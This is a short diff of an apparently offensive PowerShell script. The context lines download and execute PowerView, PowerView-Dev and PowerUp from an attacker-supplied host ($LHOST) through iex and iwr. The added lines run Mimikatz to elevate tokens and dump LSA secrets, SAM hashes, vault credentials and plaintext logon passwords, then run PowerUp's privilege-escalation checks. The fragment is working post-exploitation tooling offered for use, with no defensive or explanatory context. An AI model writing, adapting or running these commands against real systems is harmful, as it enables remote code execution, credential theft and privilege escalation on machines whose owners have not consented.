@@ -54,6 +54,7 @@ if ($LHOST){
     iex (iwr -usebasicparsing http://$LHOST/PowerView.ps1)
     iex (iwr -usebasicparsing http://$LHOST/PowerView-Dev.ps1)
     iex (iwr -usebasicparsing http://$LHOST/PowerUp.ps1)
+    invoke-mimikatz -command '"token::elevate" "lsadump::lsa /patch" "vault::cred /patch" "lsadump::secrets" "lsadump::sam" "sekurlsa::logonPasswords full"'
+    invoke-allchecks
     }
-
 }
